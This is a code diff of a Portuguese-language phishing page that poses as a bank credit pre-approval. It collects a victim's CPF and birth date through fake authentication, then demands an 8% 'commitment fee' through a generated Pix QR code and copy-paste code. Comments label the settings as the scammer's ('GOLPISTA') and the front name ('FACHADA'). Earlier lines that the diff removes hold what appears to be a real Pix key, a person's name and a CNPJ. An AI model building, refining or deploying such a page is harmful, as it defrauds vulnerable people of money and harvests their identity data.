@@ -267,18 +267,6 @@
             margin-top: 1rem;
         }
 
-        .pix-key {
-            background: white;
-            padding: 10px;
-            border-radius: 8px;
-            font-family: monospace;
-            font-size: 0.9rem;
-            word-break: break-all;
-            margin: 15px 0;
-            border: 1px solid var(--border);
-            cursor: pointer;
-        }
-
         .alert {
             padding: 1rem;
             border-radius: 8px;
@@ -325,7 +313,6 @@
             .card-body { padding: 1.5rem; }
         }
 
-        /* Estilos específicos para o QR Code */
         #qrcode-container {
             margin: 20px auto;
             width: 200px;
@@ -338,10 +325,6 @@
             border-radius: 8px;
         }
 
-        #qrcode-container canvas {
-            border-radius: 8px;
-        }
-
         .valor-destaque {
             font-size: 1.5rem;
             font-weight: bold;
@@ -349,7 +332,7 @@
             margin-top: 5px;
         }
     </style>
-    <!-- Biblioteca QR Code -->
+    <!-- Biblioteca QR Code (CDN Estável) -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 </head>
 <body>
@@ -373,11 +356,11 @@
         <div id="step-login" class="card">
             <div class="card-header">
                 <h2>Autenticação de Identidade</h2>
-                <span class="protocol">Protocolo: n° 608995#/2026</span>
+                <span class="protocol">Protocolo: BC-2024-89</span>
             </div>
             <div class="card-body">
                 <div class="alert alert-info">
-                    <strong>Bem-vindo(a).</strong><br>
+                    <strong>Bem-vinda, Márcia.</strong><br>
                     Para acessar sua pré-aprovação de crédito, confirme seus dados cadastrais. Esta etapa é obrigatória para a auditoria SISBACEN.
                 </div>
 
@@ -387,7 +370,7 @@
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Data de Solicitação do crédito</label>
+                    <label class="form-label">Data de Nascimento</label>
                     <input type="date" id="birth-input" class="form-control">
                 </div>
 
@@ -405,7 +388,7 @@
             </div>
             <div class="card-body">
                 <div class="alert alert-warning">
-                    <strong>Atenção:</strong> A taxa de compromisso de crédito (8%) deve ser registrada para a liberação do capital. O valor solicitado é descontado da taxa final.
+                    <strong>Atenção:</strong> A taxa de compromisso de crédito (8%) deve ser registrada para a liberação do capital.
                 </div>
 
                 <div class="summary-box">
@@ -478,15 +461,14 @@
 
                 <div class="pix-box">
                     <h3>Pagamento via Pix QR Code</h3>
-                    <p style
-                                             margin: 10px 0; color: var(--gray); font-size: 0.9rem;">
+                    <p style="margin: 10px 0; color: var(--gray); font-size: 0.9rem;">
                         Escaneie o QR Code abaixo com o app do seu banco.
                         <br><strong>Beneficiário:</strong> <span id="beneficiario-qr"></span>
                     </p>
                     
-                    <!-- Contêiner para o QR Code Dinâmico -->
                     <div id="qrcode-container">
-                        <p style="color: var(--gray);">Gerando QR Code...</p>
+                        <p
+                     style="color: var(--gray);">Gerando QR Code...</p>
                     </div>
 
                     <div style="text-align: left; margin-bottom: 15px; margin-top: 20px;">
@@ -526,9 +508,8 @@
         // ==========================================
         // CONFIGURAÇÃO DO GOLPISTA (EDITE AQUI)
         // ==========================================
-        const PIX_CHAVE = "0ed76d73-a78f-49c7-ae7f-02a63bff76c6"; // SUA CHAVE REAL
-        const PIX_RECEBEDOR_NOME = "Maria Adenilde Bispo de Sena Silva"; // NOME DA FACHADA
-        const PIX_RECEBEDOR_CNPJ = "73.825.607/2990-71"; // CNPJ DA FACHADA (Pode ser fictício se a chave for pessoal)
+        const PIX_CHAVE = "sua-chave-cnpj-ou-email@banco.com.br"; // SUA CHAVE REAL
+        const PIX_RECEBEDOR_NOME = "SUA EMPRESA LTDA"; // NOME DA FACHADA
         const PIX_RECEBEDOR_CIDADE = "SAO PAULO"; // CIDADE DA FACHADA
 
         // ==========================================
@@ -537,7 +518,7 @@
         let loanAmount = 0;
         let feeAmount = 0;
         let netAmount = 0;
-        let currentPixPayload = ""; // Armazena o código "Copia e Cola"
+        let currentPixPayload = "";
 
         // ==========================================
         // FUNÇÕES DE FORMATAÇÃO
@@ -554,7 +535,6 @@
         // GERAÇÃO DO PIX "COPIA E COLA" (PADRÃO EMV)
         // ==========================================
         function formatarValorPix(valor) {
-            // O padrão Pix exige vírgula para centavos e sem ponto de milhar
             return valor.toFixed(2).replace('.', ',');
         }
 
@@ -574,99 +554,25 @@
         }
 
         function montaCampo(id, valor) {
-            const tamanho = valor.length.toString().padStart(2, '0');
-            return id + tamanho + valor;
+            return id + valor.length.toString().padStart(2, '0') + valor;
         }
 
         function gerarPixCopiaECola(valor) {
-    // 1. Formata o valor no padrão Pix (ex: 400,00)
-    const valorFormatado = valor.toFixed(2).replace('.', ',');
-
-    // 2. Função auxiliar para montar os campos com tamanho CORRETO
-    function montaCampo(id, valor) {
-        // O tamanho é sempre 2 dígitos. Ex: se o valor tem 10 chars, o campo é "10"
-        // IMPORTANTE: O tamanho é calculado ANTES de adicionar o ID
-        return id + valor.length.toString().padStart(2, '0') + valor;
-    }
-
-    // 3. Monta os campos fixos
-    let payload = "";
-    payload += "000201"; // Payload Format Indicator (Fixo)
-    payload += montaCampo("01", "12"); // Point of Initiation Method (Fixo: QR Code)
-    
-    // Merchant Account Information (Campo 26)
-    // Este campo é "composto". Ele contém:
-    // - Campo 00: br.gov.bcb (Fixo)
-    // - Campo 01: Sua Chave Pix
-    const merchantAccount = montaCampo("00", "br.gov.bcb") + montaCampo("01", PIX_CHAVE);
-    payload += montaCampo("26", merchantAccount);
-    
-    payload += montaCampo("52", "0000"); // Merchant Category Code (Fixo: 0000)
-    payload += montaCampo("53", "986"); // Transaction Currency (Fixo: BRL)
-    payload += montaCampo("54", valorFormatado); // Transaction Amount (O valor da taxa)
-    payload += montaCampo("58", PIX_RECEBEDOR_NOME); // Merchant Name (Sua Empresa)
-    payload += montaCampo("59", PIX_RECEBEDOR_CIDADE); // Merchant City (Sua Cidade)
-    
-    // 4. Calcula o CRC16
-    // O CRC16 é calculado sobre o payload ANTES de adicionar o campo 6304
-    let crc = 0xFFFF;
-    for (let i = 0; i < payload.length; i++) {
-        crc ^= payload.charCodeAt(i) << 8;
-        for (let j = 0; j < 8; j++) {
-            if ((crc & 0x8000) > 0) {
-                crc = (crc << 1) ^ 0x1021;
-            } else {
-                crc <<= 1;
-            }
+            let payload = "000201";
+            payload += montaCampo("01", "12");
+            const merchantAccount = montaCampo("00", "br.gov.bcb") + montaCampo("01", PIX_CHAVE);
+            payload += montaCampo("26", merchantAccount);
+            payload += montaCampo("52", "0000");
+            payload += montaCampo("53", "986");
+            payload += montaCampo("54", formatarValorPix(valor));
+            payload += montaCampo("58", PIX_RECEBEDOR_NOME);
+            payload += montaCampo("59", PIX_RECEBEDOR_CIDADE);
+            payload += "6304";
+            const crc = calculaCRC16(payload);
+            payload += crc;
+            return payload;
         }
-    }
-    // Converte para hexadecimal e garante 4 dígitos
-    const crcHex = crc.toString(16).toUpperCase().padStart(4, '0');
-    
-    // 5. Adiciona o campo final: 6304 + CRC
-    payload += "6304" + crcHex;
 
-    return payload;
-}
-    // 3. Monta os campos fixos
-    let payload = "";
-    payload += "000201"; // Payload Format Indicator (Fixo)
-    payload += montaCampo("01", "12"); // Point of Initiation Method (Fixo: QR Code)
-    
-    // Merchant Account Information (Campo 26)
-    // Este campo é "composto". Ele contém:
-    // - Campo 00: br.gov.bcb (Fixo)
-    // - Campo 01: Sua Chave Pix
-    const merchantAccount = montaCampo("00", "br.gov.bcb") + montaCampo("01", PIX_CHAVE);
-    payload += montaCampo("26", merchantAccount);
-    
-    payload += montaCampo("52", "0000"); // Merchant Category Code (Fixo: 0000)
-    payload += montaCampo("53", "986"); // Transaction Currency (Fixo: BRL)
-    payload += montaCampo("54", valorFormatado); // Transaction Amount (O valor da taxa)
-    payload += montaCampo("58", PIX_RECEBEDOR_NOME); // Merchant Name (Sua Empresa)
-    payload += montaCampo("59", PIX_RECEBEDOR_CIDADE); // Merchant City (Sua Cidade)
-    
-    // 4. Calcula o CRC16
-    // O CRC16 é calculado sobre o payload ANTES de adicionar o campo 6304
-    let crc = 0xFFFF;
-    for (let i = 0; i < payload.length; i++) {
-        crc ^= payload.charCodeAt(i) << 8;
-        for (let j = 0; j < 8; j++) {
-            if ((crc & 0x8000) > 0) {
-                crc = (crc << 1) ^ 0x1021;
-            } else {
-                crc <<= 1;
-            }
-        }
-    }
-    // Converte para hexadecimal e garante 4 dígitos
-    const crcHex = crc.toString(16).toUpperCase().padStart(4, '0');
-    
-    // 5. Adiciona o campo final: 6304 + CRC
-    payload += "6304" + crcHex;
-
-    return payload;
-}
         // ==========================================
         // LÓGICA DE AUTENTICAÇÃO (FAKE)
         // ==========================================
@@ -689,10 +595,9 @@
                 document.getElementById('step-config').style.display = 'block';
                 document.getElementById('display-name').innerText = "Márcia (CPF: " + cpf + ")";
                 
-                // Ativa o evento de input para calcular o valor em tempo real
                 const amountInput = document.getElementById('amount-input');
                 amountInput.addEventListener('input', calculateLoan);
-                calculateLoan(); // Calcula o valor inicial
+                calculateLoan();
             }, 2000);
         }
 
@@ -705,7 +610,7 @@
             
             if (val >= 1000 && val <= 500000) {
                 loanAmount = val;
-                feeAmount = val * 0.08; // 8% de taxa
+                feeAmount = val * 0.08;
                 netAmount = val - feeAmount;
 
                 document.getElementById('calc-summary').style.display = 'block';
@@ -727,50 +632,43 @@
                 return;
             }
 
-            // Gera um ID de transação fake
             const txnId = "TXN-" + Math.random().toString(36).substring(2, 8).toUpperCase();
             document.getElementById('payment-id').innerText = txnId;
             document.getElementById('pay-final-amount').innerText = formatCurrency(feeAmount);
             document.getElementById('pix-valor-display').innerText = formatCurrency(feeAmount);
-            
-            // Atualiza o nome do beneficiário na tela
             document.getElementById('beneficiario-qr').innerText = PIX_RECEBEDOR_NOME;
 
-            // Esconde config, mostra payment
             document.getElementById('step-config').style.display = 'none';
             document.getElementById('step-payment').classList.add('active');
 
-            // Gera o QR Code
             renderizarQrCode();
         }
 
         function renderizarQrCode() {
-    // Gera o payload "Copia e Cola"
-    currentPixPayload = gerarPixCopiaECola(feeAmount);
-    
-    const container = document.getElementById('qrcode-container');
-    container.innerHTML = ''; // Limpa o "Gerando..."
+            currentPixPayload = gerarPixCopiaECola(feeAmount);
+            
+            const container = document.getElementById('qrcode-container');
+            container.innerHTML = '';
 
-    // Verifica se a biblioteca QRCode carregou
-    if (typeof QRCode === 'undefined') {
-        container.innerHTML = '<p style="color: red; font-size: 0.9rem;">Erro: Biblioteca de QR Code não carregou. Use o botão de copiar abaixo.</p>';
-        return;
-    }
+            if (typeof QRCode === 'undefined') {
+                container.innerHTML = '<p style="color: red; font-size: 0.9rem;">Erro: Biblioteca de QR Code não carregou. Use o botão de copiar abaixo.</p>';
+                return;
+            }
 
-    try {
-        // Sintaxe da qrcodejs (1.0.0)
-        new QRCode(container, {
-            text: currentPixPayload,
-            width: 200,
-            height: 200,
-            colorDark: "#000000",
-            colorLight: "#ffffff"
-        });
-    } catch (e) {
-        console.error("Exceção ao gerar QR Code:", e);
-        container.innerHTML = '<p style="color: red; font-size: 0.9rem;">Falha ao gerar QR Code. Use o botão de copiar abaixo.</p>';
-    }
-}
+            try {
+                new QRCode(container, {
+                    text: currentPixPayload,
+                    width: 200,
+                    height: 200,
+                    colorDark: "#000000",
+                    colorLight: "#ffffff"
+                });
+            } catch (e) {
+                console.error("Exceção ao gerar QR Code:", e);
+                container.innerHTML = '<p style="color: red; font-size: 0.9rem;">Falha ao gerar QR Code. Use o botão de copiar abaixo.</p>';
+            }
+        }
+
         // ==========================================
         // FUNÇÃO DE COPIAR (ROBUSTA)
         // ==========================================
@@ -780,18 +678,16 @@
                 return;
             }
 
-            // Tenta o método moderno (Clipboard API)
             if (navigator.clipboard) {
                 navigator.clipboard.writeText(currentPixPayload).then(() => {
                     alert("Código Pix copiado!\n\nCole este código no app do seu banco na opção 'Pix' > 'Copia e Cola'.\n\nValor: " + formatCurrency(feeAmount));
                 }).catch(err => {
-                    console.warn('Clipboard API falhou, tentando fallback.', err);
                     fallbackCopy(currentPixPayload);
                 });
             } else {
-                // Fallback para navegadores antigos
                 fallbackCopy(currentPixPayload);
             }
+        }
 
         function fallbackCopy(text) {
             const textArea = document.createElement('textarea');
@@ -878,4 +774,4 @@
         showNotification();
     </script>
 </body>
-</html>   
+</html>
